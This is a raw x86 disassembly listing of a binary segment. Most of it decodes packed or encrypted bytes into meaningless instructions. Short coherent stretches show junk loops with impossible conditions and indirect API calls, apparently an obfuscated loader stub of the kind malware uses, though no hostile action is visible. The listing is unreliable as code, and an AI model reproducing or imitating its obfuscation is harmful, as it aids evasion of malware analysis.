  4072bb:	jge    0x40730b
  4072bd:	cmp    esp,DWORD PTR [ebp-0xe]
  4072c0:	inc    edi
  4072c1:	or     al,0x39
  4072c3:	and    edi,edx
  4072c5:	into   
  4072c6:	popa   
  4072c7:	(bad)  
  4072c8:	rcl    BYTE PTR [edi],1
  4072ca:	arpl   sp,bx
  4072cc:	jbe    0x407346
  4072ce:	int3   
  4072cf:	rcr    bl,0x96
  4072d2:	jecxz  0x40728f
  4072d4:	adc    al,0xee
  4072d6:	fs rcr dl,cl
  4072d9:	pop    ebx
  4072da:	xor    DWORD PTR [eax+0x18],0xffffff86
  4072de:	fimul  WORD PTR [esi+0x50431ee5]
  4072e4:	lock fs loope 0x4072a9
  4072e8:	test   eax,0x81441224
  4072ed:	cmp    ah,BYTE PTR ds:0xaae0597a
  4072f3:	mov    dh,0x91
  4072f5:	(bad)  
  4072f6:	shr    BYTE PTR [ebx],cl
  4072f8:	jns    0x4072cb
  4072fa:	je     0x40736b
  4072fc:	inc    eax
  4072fd:	clc    
  4072fe:	mov    bl,0x61
  407300:	aam    0x6a
  407302:	or     ecx,DWORD PTR [eax]
  407304:	(bad)  [ecx]
  407306:	sti    
  407307:	ds pop ds
  407309:	jne    0x407389
  40730b:	push   0x1b882bae
  407310:	cld    
  407311:	push   ecx
  407312:	mov    ebx,0x80500b7b
  407317:	add    BYTE PTR [edi-0x3cca3f46],cl
  40731d:	push   0x6e
  40731f:	pop    eax
  407320:	aad    0xc7
  407322:	inc    eax
  407323:	dec    ecx
  407324:	or     al,0xbf
  407326:	add    al,0x27
  407328:	cmp    eax,0x84e3cc46
  40732d:	inc    edx
  40732e:	xor    esi,ebp
  407330:	jno    0x407311
  407332:	pop    edi
  407333:	stc    
  407334:	jmp    FWORD PTR [eax+0x36beb576]
  40733a:	mov    ah,0xff
  40733c:	xchg   ecx,ebp
  40733e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40733f:	adc    esp,eax
  407341:	repz push ecx
  407343:	jmp    0x4072e7
  407345:	push   0xff6b34c
  40734a:	test   BYTE PTR [edi],ah
  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x4336d7,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x4337ab
  40736f:	or     DWORD PTR ds:0x4337af,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x4073fe
  407387:	test   DWORD PTR [eax+ebp*2+0x7e7ec20a],esi
  40738e:	add    eax,0xa27e7e7c
  407393:	(bad)  
  407394:	enter  0xdec9,0x30
  407398:	aas    
  407399:	inc    edi
  40739a:	in     al,dx
  40739b:	sahf   
  40739c:	fld    st(0)
  40739e:	xor    DWORD PTR [eax+0x7ad2f773],0xfcc1feb1
  4073a8:	xchg   edx,eax
  4073a9:	ss pop esi
  4073ab:	ficomp DWORD PTR [edx+0x36]
  4073ae:	dec    esi
  4073af:	fs pusha 
  4073b1:	lea    ebp,[eax]
  4073b3:	jns    0x40740a
  4073b5:	lods   eax,DWORD PTR ds:[esi]
  4073b6:	lock or cl,BYTE PTR gs:[edx-0x76f5c8db]
  4073be:	fmul   st,st(0)
  4073c0:	in     al,0x1c
  4073c2:	mov    WORD PTR [eax-0x7c71a7c5],es
  4073c8:	fcmovne st,st(3)
  4073ca:	cmp    BYTE PTR [edx+0x7d],al
  4073cd:	icebp  
  4073ce:	and    DWORD PTR [ecx+0x356a2d69],0xc
  4073d5:	sbb    DWORD PTR [ebx],0xd40021d9
  4073db:	sbb    DWORD PTR [ebp-0x6ca69be8],ebp
  4073e1:	popf   
  4073e2:	inc    ecx
  4073e3:	jne    0x4073f4
  4073e5:	sbb    bh,bh
  4073e7:	and    al,0xba
  4073e9:	and    dh,ch
  4073eb:	and    dl,al
  4073ed:	in     eax,dx
  4073ee:	lock adc eax,0x41ab68b9
  4073f4:	daa    
  4073f5:	and    bl,BYTE PTR [ecx+0x358447e3]
  4073fb:	mov    eax,ds:0xb1584164
  407400:	adc    dh,dl
  407402:	jle    0x407428
  407404:	or     al,0x80
  407406:	push   edx
  407407:	stos   DWORD PTR es:[edi],eax
  407408:	dec    esi
  407409:	push   edi
  40740a:	or     al,0xba
  40740c:	jl     0x40747f
  40740e:	repz mov cl,0x6a
  407411:	int    0x37
  407413:	jnp    0x407412
  407415:	jnp    0x4073c1
  407417:	retf   
  407418:	dec    edx
  407419:	scas   al,BYTE PTR es:[edi]
  40741a:	sbb    eax,0x894bbe2b
  40741f:	sbb    al,bl
  407421:	cli    
  407422:	mov    ebx,0xc8eebbfb
  407427:	rcr    DWORD PTR [esi+0x1c],1
  40742a:	mov    ebp,0x3c449bb2
  40742f:	cld    
  407430:	inc    edx
  407431:	cmp    esp,DWORD PTR [ecx]
  407433:	popa   
  407434:	jno    0x407417
  407436:	inc    edx
  407437:	enter  0xcc3e,0x5d
  40743b:	jbe    0x407481
  40743d:	mov    dh,0x4e
  40743f:	sub    eax,0xbb15ed80
  407444:	sbb    DWORD PTR [ebx+edi*4-0x34],ebx
  407448:	icebp  
  407449:	xchg   DWORD PTR [esi+0x17aedbf8],eax
  40744f:	das    
  407450:	push   0x3b
  407452:	(bad)  
  407454:	adc    esp,edi
  407456:	dec    ebx
  407457:	daa    
  407458:	lock nop
  40745a:	fdivr  st(6),st
  40745c:	push   0x3a0c0225
  407461:	icebp  
  407462:	adc    DWORD PTR ss:[eax+0x3d],ebp
  407466:	sbb    cl,ch
  407468:	fcom   DWORD PTR [ebp-0x3d482463]
  40746e:	pop    ecx
  40746f:	stos   DWORD PTR es:[edi],eax
  407470:	pop    ss
  407471:	js     0x4074d2
  407473:	mov    eax,ds:0x94dc0d71
  407478:	lds    ebp,FWORD PTR [esi+ebp*2]
  40747b:	jnp    0x4074ac
  40747d:	sbb    eax,0xfbb034f
  407482:	in     al,0xfb
  407484:	lods   eax,DWORD PTR ds:[esi]
  407485:	sub    ch,dh
  407487:	xchg   edi,eax
  407488:	or     eax,0xe705d920
  40748d:	dec    edi
  40748e:	or     bh,BYTE PTR [ecx-0x5031ab65]
  407494:	mov    DWORD PTR ds:0xe43eb7d,ebx
  40749a:	sbb    bh,BYTE PTR [edi-0x1a3fd040]
  4074a0:	or     eax,0xa16953ed
  4074a5:	cli    
  4074a6:	int3   
  4074a7:	sub    cl,ch
  4074a9:	lea    eax,[edx]
  4074ab:	mov    al,0x2e
  4074ad:	shl    DWORD PTR [edi],cl
  4074af:	in     eax,dx
  4074b0:	cs push es
  4074b2:	add    BYTE PTR [ebp+0x32],bh
  4074b5:	or     al,0x45
  4074b7:	sub    ch,BYTE PTR [ecx]
  4074b9:	cmp    esp,DWORD PTR [ebx+0x4f8bc4c]
  4074bf:	retf   
  4074c0:	dec    esi
  4074c1:	stos   DWORD PTR es:[edi],eax
  4074c2:	inc    esi
  4074c3:	dec    ecx
  4074c4:	jmp    0xf9f4:0xa4a59576
  4074cb:	fild   DWORD PTR [eax]
  4074cd:	(bad)  
  4074ce:	bswap  edi
  4074d0:	inc    eax
  4074d1:	and    ecx,DWORD PTR [ecx]
  4074d3:	cmc    
  4074d4:	or     cl,BYTE PTR [edx]
  4074d6:	mov    ebx,0xf524f2a3
  4074db:	pop    ecx
  4074dc:	dec    eax
  4074dd:	cmp    edi,edi
  4074df:	repz mul DWORD PTR [esi]
  4074e2:	ja     0x40750f
  4074e4:	mov    DWORD PTR [ecx-0x56791b33],edi
  4074ea:	cli    
  4074eb:	cld    
  4074ec:	cmp    eax,0xc566b749
  4074f1:	sbb    esp,edx
  4074f3:	dec    esi
  4074f4:	aam    0x57
  4074f6:	loopne 0x40752d
  4074f8:	jmp    0xa7f3113a
  4074fd:	iret   
  4074fe:	gs and eax,0x30ca83a7
  407504:	hlt    
  407505:	outs   dx,BYTE PTR ds:[esi]
  407506:	add    dl,cl
  407508:	pop    es
  407509:	(bad)  
  40750a:	gs addr16 test eax,0xdb98fc5b
  407511:	adc    eax,0x9f426337
  407516:	das    
  407517:	(bad)  
  407518:	jns    0x40752f
  40751a:	sub    al,0x76
  40751c:	stc    
  40751d:	out    0x1e,eax
  40751f:	adc    al,BYTE PTR [eax-0x4405beb7]
  407525:	aaa    
  407526:	icebp  
  407527:	lds    ebp,FWORD PTR [esi]
  407529:	pusha  
  40752a:	(bad)  
  40752b:	(bad)  
  40752c:	sub    edi,DWORD PTR [edi+0x1]
  40752f:	je     0x4074b5
  407531:	push   es
  407532:	add    eax,0x7eedd474
  407537:	push   esp
  407538:	push   eax
  407539:	mov    ?,WORD PTR ds:0x2e54d1e9
  40753f:	popf   
  407540:	stos   DWORD PTR es:[edi],eax
  407541:	std    
  407542:	or     bh,BYTE PTR [ecx+0x4e]
  407545:	rcr    DWORD PTR [esi-0x3ea9d56e],1
  40754b:	xchg   ebp,eax
  40754c:	jnp    0x407500
  40754e:	xor    eax,0xc2d2c55a
  407553:	leave  
  407554:	in     al,dx
  407555:	mov    esi,0x98ebaed3
  40755a:	push   ds
  40755b:	inc    esp
  40755c:	aam    0x3
  40755e:	aaa    
  40755f:	std    
  407560:	pop    esp
  407561:	or     edi,DWORD PTR ds:0xd662f962
  407567:	(bad)  
  407568:	daa    
  407569:	xor    eax,0x9e449190
  40756e:	cwde   
  40756f:	xchg   esi,eax
  407570:	ret    
  407571:	sub    BYTE PTR [ebp+0x7240454a],bh
  407577:	lds    edx,FWORD PTR [ecx-0x316e514f]
  40757d:	clc    
  40757e:	sub    DWORD PTR [ebp-0x332bdcf5],ebp
  407584:	mov    ebp,0x2d44b870
  407589:	push   0x188cb54a
  40758e:	fnstcw WORD PTR [ebx-0x75]
  407591:	mov    eax,ds:0x52594d8a
  407596:	ins    DWORD PTR es:[edi],dx
  407597:	pop    eax
  407598:	pop    ds
  407599:	rol    DWORD PTR [edi+0x45c76bf9],cl
  40759f:	in     al,dx
  4075a0:	xor    DWORD PTR [ebp+0x5135f89c],eax
  4075a6:	add    eax,0x77b80000
  4075ab:	xchg   ebp,eax
  4075ac:	add    BYTE PTR [eax],al
  4075ae:	mov    ecx,DWORD PTR ds:0x4336d3
  4075b4:	sub    DWORD PTR ds:0x43368f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x43367f
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x4336eb,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43368f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43368f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43368f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43368f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43368f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	shl    DWORD PTR [ebp-0x3feeb306],0x7e
  40765c:	jle    0x407663
  40765e:	jl     0x4076de
  407660:	jle    0x40766e
  407662:	cmp    ecx,DWORD PTR [esi*1+0x4b62b07b]
  407669:	loopne 0x4075f0
  40766b:	push   ss
  40766c:	inc    esi
  40766d:	mov    esp,0x692c809
  407672:	aas    
  407673:	jmp    DWORD PTR [esi]
  407675:	mov    ds:0x289d885c,al
  40767a:	lods   eax,DWORD PTR ds:[esi]
  40767b:	bound  esi,QWORD PTR fs:[ebx-0x73a611be]
  407682:	aad    0x30
  407684:	sub    DWORD PTR [edx-0x6d426d20],ebx
  40768a:	shr    BYTE PTR [edx],cl
  40768c:	inc    eax
  40768d:	pop    ss
  40768e:	in     al,dx
  40768f:	std    
  407690:	mov    ebp,0xf767f207
  407695:	xor    eax,0x812ceea0
  40769a:	(bad)  
  40769b:	adc    eax,0x540d9603
  4076a0:	pop    ebx
  4076a1:	add    edx,DWORD PTR [edx+ebp*4+0x79]
  4076a5:	xchg   edx,eax
  4076a6:	paddsw mm1,QWORD PTR [ecx]
  4076a9:	adc    DWORD PTR [ecx-0x5b7b1e07],ecx
  4076af:	ret    0x1e3f
  4076b2:	mov    ds:0x9cde3af8,eax
  4076b7:	into   
  4076b8:	or     BYTE PTR [ecx-0x42],dl
  4076bb:	mov    al,ds:0xf65174e0
  4076c0:	push   ebp
  4076c1:	mov    edi,0x5b470191
  4076c6:	or     edi,DWORD PTR [eax-0x26]
  4076c9:	mov    eax,0xed8bd0fc
  4076ce:	add    dh,dh
  4076d0:	pusha  
  4076d1:	jge    0x407738
  4076d3:	add    DWORD PTR [esi-0x2d32bb19],0x18
  4076da:	mov    esi,0x88307c83
  4076df:	mov    edi,0x6c7fa336
  4076e4:	es mov bl,0xc1
  4076e7:	fmul   DWORD PTR [edx+eiz*4+0x5f]
  4076eb:	add    DWORD PTR [edi+eiz*8-0x46],esp
  4076ef:	sub    eax,0xa4d903fc
  4076f4:	mov    BYTE PTR [eax],0x1
  4076f7:	out    0xb6,eax
  4076f9:	pop    ecx
  4076fa:	retf   0xc991
  4076fd:	(bad)  
  4076ff:	(bad)  
  407700:	shl    al,0xaa
  407703:	xor    eax,0xda515b17
  407708:	retf   0x9a0f
  40770b:	cmp    cl,bl
  40770d:	xor    bh,bh
  40770f:	fxch   st(3)
  407711:	js     0x4076e5
  407713:	mov    ds:0xd8274039,al
  407718:	inc    edx
  407719:	or     eax,0x9e6b9a23
  40771e:	mov    ecx,0x3db88e14
  407723:	mov    cl,0xbf
  407725:	sbb    esp,DWORD PTR [esi+0x5e4e962a]
  40772b:	inc    edx
  40772c:	sar    BYTE PTR [edx],0x39
  40772f:	loop   0x4076c2
  407731:	push   eax
  407732:	mov    ebp,0xf66e6881
  407737:	inc    edi
  407738:	in     eax,0x5a
  40773a:	scas   al,BYTE PTR es:[edi]
  40773b:	mov    esp,esi
  40773d:	jnp    0x4077b2
  40773f:	pop    ebp
  407740:	cwde   
  407741:	inc    ebp
  407742:	mov    ebp,0x5165e287
  407747:	jmp    0x407778
  407749:	sahf   
  40774a:	in     eax,0x82
  40774c:	and    eax,0x85f934e2
  407751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407752:	sbb    BYTE PTR [eax+ecx*8+0x7cd3283],dl
  407759:	push   es
  40775a:	push   ebp
  40775b:	jmp    0xc939:0x215db4ca
  407762:	les    ebp,FWORD PTR [eax+edx*1-0x12]
  407766:	adc    BYTE PTR [ebp-0x3c],bh
  407769:	push   edx
  40776a:	leave  
  40776b:	stos   DWORD PTR es:[edi],eax
  40776c:	fst    QWORD PTR [esi]
  40776e:	stc    
  40776f:	clc    
  407770:	lahf   
  407771:	xchg   esp,eax
  407772:	pop    ebp
  407773:	push   ds
  407774:	pusha  
  407775:	xchg   esi,eax
  407776:	in     al,0x11
  407778:	push   ebp
  407779:	sbb    DWORD PTR ds:0x955771f8,ecx
  40777f:	call   0xa021:0xd1aa9497
  407786:	jb     0x407708
  407788:	jno    0x4077ad
  40778a:	loope  0x4077a4
  40778c:	outs   dx,BYTE PTR ds:[esi]
  40778d:	shr    BYTE PTR [ecx+esi*4-0x13],1
  407791:	mov    BYTE PTR [edx-0x5c8f953f],bl
  407797:	cmp    DWORD PTR [ebx],edi
  407799:	in     al,dx
  40779a:	mov    esp,0x479e8760
  40779f:	cmp    eax,0xc3e2ea19
  4077a4:	popf   
  4077a5:	mov    ds,WORD PTR [ebp-0x4a]
  4077a8:	and    DWORD PTR [esi],esp
  4077aa:	dec    ecx
  4077ab:	call   0x9f2d:0xe9092208
  4077b2:	push   ss
  4077b3:	mov    ecx,esi
  4077b5:	dec    ecx
  4077b6:	sbb    ecx,ebp
  4077b8:	xchg   esi,eax
  4077b9:	add    eax,0xd8966332
  4077be:	call   0x893a3404
  4077c3:	push   edi
  4077c4:	jb     0x40780f
  4077c6:	adc    eax,0x87853794
  4077cb:	xor    eax,0xf06beab0
  4077d0:	mov    dl,bh
  4077d2:	xchg   ebp,eax
  4077d3:	sbb    BYTE PTR [eax-0x387e2618],ah
  4077d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077da:	adc    BYTE PTR [esi],bl
  4077dc:	lds    edx,FWORD PTR [ebx+0x19]
  4077df:	mov    BYTE PTR [esi],dl
  4077e1:	pusha  
  4077e2:	push   0xffffffb7
  4077e4:	mov    cl,0xb8
  4077e6:	jp     0x407850
  4077e8:	rcr    DWORD PTR [edx],1
  4077ea:	push   cx
  4077ec:	mov    eax,ds:0x81c858f2
  4077f1:	in     al,0x16
  4077f3:	mov    ah,0xe8
  4077f5:	or     bh,bh
  4077f7:	mov    bl,0xf6
  4077f9:	mov    bh,0xe3
  4077fb:	cld    
  4077fc:	pop    es
  4077fd:	ja     0x40782a
  4077ff:	mov    ds,edi
  407801:	inc    ebp
  407802:	adc    ah,BYTE PTR [edx+0x70]
  407805:	jl     0x407861
  407807:	retf   0x33d6
  40780a:	cmp    ecx,DWORD PTR [edi-0x16a37c22]
  407810:	dec    ebx
  407811:	shl    DWORD PTR [edx],cl
  407813:	add    dh,BYTE PTR [edi-0x1fa1fd1a]
  407819:	cmp    ch,ch
  40781b:	jbe    0x4077a8
  40781d:	mov    bl,0xd9
  40781f:	gs push ds
  407821:	popf   
  407822:	mov    ch,0xf6
  407824:	mov    ch,0x3e
  407826:	pushf  
  407827:	aam    0xf7
  407829:	jge    0x4078a0
  40782b:	push   ebp
  40782c:	sub    al,0xbc
  40782e:	adc    al,0xa6
  407830:	dec    eax
  407831:	mov    ah,0xc0
  407833:	adc    esp,DWORD PTR [esi]
  407835:	push   edx
  407836:	ins    DWORD PTR es:[edi],dx
  407837:	les    edx,FWORD PTR [ebx]
  407839:	xchg   ecx,eax
  40783a:	mov    eax,ds:0x7ea5c80b
  40783f:	test   BYTE PTR ds:0x5cae5bb9,dl
  407845:	mov    ah,0xb9
  407847:	dec    eax
  407848:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407849:	repnz push ss
  40784b:	jae    0x4077e5
  40784d:	sbb    DWORD PTR [eax],ebx
  40784f:	xor    eax,0x845db796
  407854:	push   cs
  407855:	inc    edx
  407856:	mov    ds:0xfdf8e100,al
  40785b:	cli    
  40785c:	test   eax,0x32c38924
  407861:	fwait
  407862:	push   cs
  407863:	out    dx,al
  407864:	ins    DWORD PTR es:[edi],dx
  407865:	inc    edx
  407866:	dec    ebx
  407867:	mov    WORD PTR [ecx-0x6f],ds
  40786a:	ret    0x5693
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x43367f,0x4336e3
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43379b,0x12
  40788b:	cmp    DWORD PTR ds:0x43379b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43379b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43379b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43379b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43371f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43371f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43371f,esi
  4078e0:	cmp    DWORD PTR ds:0x43371f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43371f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x5e,eax
  407922:	and    eax,0xce241770
  407927:	jle    0x4079a7
  407929:	add    eax,0xb07e7e7c
  40792e:	pop    ecx
  40792f:	jmp    0x407954
  407931:	sbb    eax,0xd93c1d4c
  407936:	push   cs
  407937:	jmp    0x5578:0xa42774b1
  40793e:	sbb    BYTE PTR [esi+eax*1],dh
  407941:	ja     0x40799c
  407943:	shl    BYTE PTR [ebx+esi*8+0x6f98d8d7],0xde
  40794b:	out    0x81,al
  40794d:	clc    
  40794e:	out    dx,eax
  40794f:	clc    
  407950:	add    dl,BYTE PTR [ecx-0x16]
  407953:	jo     0x407942
  407955:	repz in al,0xd
  407958:	xchg   BYTE PTR [edi-0x6f],dl
  40795b:	idiv   dl
  40795d:	cmp    eax,0x4ea2e838
  407962:	cmp    eax,eax
  407964:	mov    bh,0xcf
  407966:	bound  ebp,QWORD PTR [edi]
  407968:	and    esi,DWORD PTR [edx]
  40796a:	cmp    al,0xf8
  40796c:	or     al,BYTE PTR [eax+edx*4-0x3f8cbb17]
  407973:	jle    0x4079a8
  407975:	jle    0x4079b7
  407977:	popa   
  407978:	dec    ebx
  407979:	jae    0x407993
  40797b:	js     0x40791a
  40797d:	add    bl,al
  40797f:	sbb    BYTE PTR [edx-0x38083a0b],bh
  407985:	dec    eax
  407986:	(bad)  
  407987:	push   esp
  407988:	inc    edx
  407989:	out    dx,eax
  40798a:	inc    eax
  40798b:	popa   
  40798c:	adc    ebp,DWORD PTR [edx+0x374de160]
  407992:	pop    eax
  407993:	stc    
  407994:	xchg   ecx,eax
  407995:	or     al,0x88
  407997:	ds pusha 
  407999:	aad    0x49
  40799b:	mov    edi,0x4ba71cfd
  4079a0:	bound  edx,QWORD PTR [eax+0x76]
  4079a3:	sbb    eax,0x4658da8b
  4079a8:	xchg   esp,eax
  4079a9:	push   edi
  4079aa:	repnz fwait
  4079ac:	stos   BYTE PTR es:[edi],al
  4079ad:	mov    dl,0x30
  4079af:	adc    eax,0x19fa96a3
  4079b4:	(bad)  
  4079b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079b6:	xchg   edx,eax
  4079b7:	pop    es
  4079b8:	or     bl,BYTE PTR [edi+0x30]
  4079bb:	mov    eax,ds:0x47d1832c
  4079c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079c1:	fadd   st(3),st
  4079c3:	out    dx,eax
  4079c4:	or     eax,0x9e001552
  4079c9:	(bad)  
  4079ca:	pop    edi
  4079cb:	dec    edx
  4079cc:	xchg   edx,eax
  4079cd:	and    bh,dl
  4079cf:	call   0xad5f4330
  4079d4:	fbstp  TBYTE PTR [ebx+0x3055e52e]
  4079da:	into   
  4079db:	fnsave [edx+0x7e89c84e]
  4079e1:	push   edi
  4079e2:	dec    ebx
  4079e3:	ds xchg edi,eax
  4079e5:	xchg   esp,eax
  4079e6:	(bad)  
  4079e7:	in     eax,0x1d
  4079e9:	mov    ds:0x3bc258bb,eax
  4079ee:	mov    ebx,0x75d14c3c
  4079f3:	push   edi
  4079f4:	pop    ebx
  4079f5:	clc    
  4079f6:	add    ch,BYTE PTR [esp+edx*1+0x34]
  4079fa:	jnp    0x4079fd
  4079fc:	(bad)  
  4079fd:	scas   al,BYTE PTR es:[edi]
  4079fe:	in     al,0x19
  407a00:	rcl    BYTE PTR [eax+0x682424c8],cl
  407a06:	(bad)  
  407a07:	jns    0x4079ad
  407a09:	sbb    ebx,DWORD PTR [ecx]
  407a0b:	cld    
  407a0c:	adc    BYTE PTR [edi],ah
  407a0e:	out    0x66,eax
  407a10:	add    eax,DWORD PTR [edx+0x5a3a28e5]
  407a16:	adc    bh,BYTE PTR [edx+eax*1+0x585b7786]
  407a1d:	and    BYTE PTR [esi-0xa05c04b],dl
  407a23:	sbb    eax,DWORD PTR [ecx-0x18]
  407a26:	aas    
  407a27:	xor    ecx,ecx
  407a29:	out    0xc0,al
  407a2b:	js     0x4079e7
  407a2d:	xor    BYTE PTR [eax+0x5b],0xf0
  407a31:	popf   
  407a32:	ss inc ah
  407a35:	and    BYTE PTR [edx+0x1],dl
  407a38:	mov    esp,0xc45a4b01
  407a3d:	xor    al,0xf
  407a3f:	pop    esi
  407a40:	popa   
  407a41:	retf   0xea68
  407a44:	cmp    ah,dl
  407a46:	stos   DWORD PTR es:[edi],eax
  407a47:	xor    DWORD PTR [ebx],esp
  407a49:	mov    edi,0xe93ca019
  407a4e:	mov    al,ds:0xd42c0fad
  407a53:	adc    ah,0x1c
  407a56:	lods   eax,DWORD PTR ds:[esi]
  407a57:	mov    DWORD PTR [eax-0x23a16dc],edx
  407a5d:	or     al,BYTE PTR [edx]
  407a5f:	jle    0x407a33
  407a61:	dec    ecx
  407a62:	jne    0x407aac
  407a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a65:	mov    bl,0x2a
  407a67:	sub    eax,DWORD PTR [ecx-0x57]
  407a6a:	jb     0x407a65
  407a6c:	(bad)  
  407a6d:	bound  edi,QWORD PTR [ebp+0x9]
  407a70:	mov    ds:0xdf74fd5d,al
  407a75:	les    ebp,FWORD PTR [ecx+eax*2]
  407a78:	inc    eax
  407a79:	xchg   ebx,eax
  407a7a:	loopne 0x407a55
  407a7c:	cmp    ah,BYTE PTR [eax+0x18]
  407a7f:	and    DWORD PTR [ecx-0x594cdf67],0xa2e22871
  407a89:	and    BYTE PTR [ecx-0x31],0xbc
  407a8d:	lea    ecx,[eax+0x4551c992]
  407a93:	sub    BYTE PTR [eax],0xd9
  407a96:	iret   
  407a97:	xor    BYTE PTR [eax-0x3b],dh
  407a9a:	add    al,dh
  407a9c:	mov    edi,0x7f641a0b
  407aa1:	cmp    ch,BYTE PTR [ecx-0x5c]
  407aa4:	and    BYTE PTR [eax],0x83
  407aa7:	mov    ecx,0x55d5fffa
  407aac:	jmp    0xabb9e173
  407ab1:	inc    esi
  407ab2:	adc    ebp,ebp
  407ab4:	sti    
  407ab5:	cwde   
  407ab6:	inc    ebx
  407ab7:	lods   al,BYTE PTR ds:[esi]
  407ab8:	fdivr  DWORD PTR [edi+0x12]
  407abb:	pop    ds
  407abc:	and    edi,eax
  407abe:	mov    bh,0xe
  407ac0:	mov    bh,0x20
  407ac2:	and    ecx,DWORD PTR [ebp+0x4f81a2a4]
  407ac8:	mov    es,edi
  407aca:	xchg   edx,eax
  407acb:	adc    al,0xee
  407acd:	loopne 0x407b05
  407acf:	xor    bl,ah
  407ad1:	jp     0x407ad9
  407ad3:	inc    eax
  407ad4:	clc    
  407ad5:	imul   DWORD PTR [ebx+0x1551c788]
  407adb:	imul   edi,DWORD PTR [ecx],0x58b3c7c4
  407ae1:	sbb    DWORD PTR [edx+edx*2-0x48],0x52
  407ae6:	push   0xffffff92
  407ae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ae9:	sbb    eax,DWORD PTR [eax+esi*4+0x5c]
  407aed:	mov    ds:0x7d64239,al
  407af2:	outs   dx,BYTE PTR ds:[esi]
  407af3:	cwde   
  407af4:	mov    bh,0xe3
  407af6:	cld    
  407af7:	fnstenv [edi-0x7a9227c9]
  407afd:	xlat   BYTE PTR ds:[ebx]
  407afe:	ins    BYTE PTR es:[edi],dx
  407aff:	sbb    al,0x83
  407b01:	sahf   
  407b02:	pop    ss
  407b03:	dec    esp
  407b04:	jbe    0x407a93
  407b06:	arpl   dx,ax
  407b08:	cld    
  407b09:	fs test al,0x45
  407b0c:	add    DWORD PTR es:[edx-0x42],ebp
  407b10:	mov    eax,DWORD PTR [eax+edi*1]
  407b13:	push   esp
  407b14:	push   esi
  407b15:	data16 mov cs,WORD PTR [edi+0x7e]
  407b19:	pop    eax
  407b1a:	fmul   QWORD PTR [ebx+0x19]
  407b1d:	(bad)  
  407b1e:	pop    ebp
  407b1f:	std    
  407b20:	xlat   BYTE PTR ds:[ebx]
  407b21:	xchg   edi,eax
  407b22:	mov    BYTE PTR [edi-0x4d],ah
  407b25:	cld    
  407b26:	sub    eax,edx
  407b28:	fidivr DWORD PTR [edx+esi*4-0x1f]
  407b2c:	mov    al,0x24
  407b2e:	jmp    DWORD PTR [edx+eiz*2]
  407b31:	cmp    BYTE PTR ds:0x2e9f4c5e,ah
  407b37:	outs   dx,BYTE PTR ds:[esi]
  407b38:	xor    eax,ecx
  407b3a:	adc    DWORD PTR ds:0x43372b,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x4336d3,0x57a0
  407b53:	xor    ebx,ecx
